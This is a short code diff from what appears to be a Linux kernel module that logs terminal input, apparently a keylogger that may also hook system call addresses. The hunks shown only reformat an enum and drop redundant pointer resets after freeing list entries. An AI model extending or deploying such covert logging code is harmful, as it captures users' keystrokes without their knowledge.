@@ -774,7 +774,12 @@ _tty_dump(uid_t uid, pid_t pid, char *buf, ssize_t len) {
     prinfo("%s\n", buf);
 }
 
-enum { R_NONE, R_RETURN, R_NEWLINE=2, R_RANGE=4 };
+enum {
+    R_NONE=0,
+    R_RETURN=1,
+    R_NEWLINE=2,
+    R_RANGE=4
+};
 static void _tty_write_log(uid_t uid, pid_t pid, char *buf, ssize_t len) {
     static loff_t offset;
     struct timespec64 ts;
@@ -871,7 +876,6 @@ static void _keylog_cleanup_list(void) {
     list_for_each_entry_safe(node, node_safe, &keylog_node, list) {
         list_del(&node->list);
         kfree(node);
-        node = NULL;
     }
 }
 
@@ -1352,6 +1356,5 @@ void sys_deinit(void) {
     list_for_each_entry_safe(sl, sl_safe, &sys_addr, list) {
         list_del(&sl->list);
         kfree(sl);
-        sl = NULL;
     }
 }
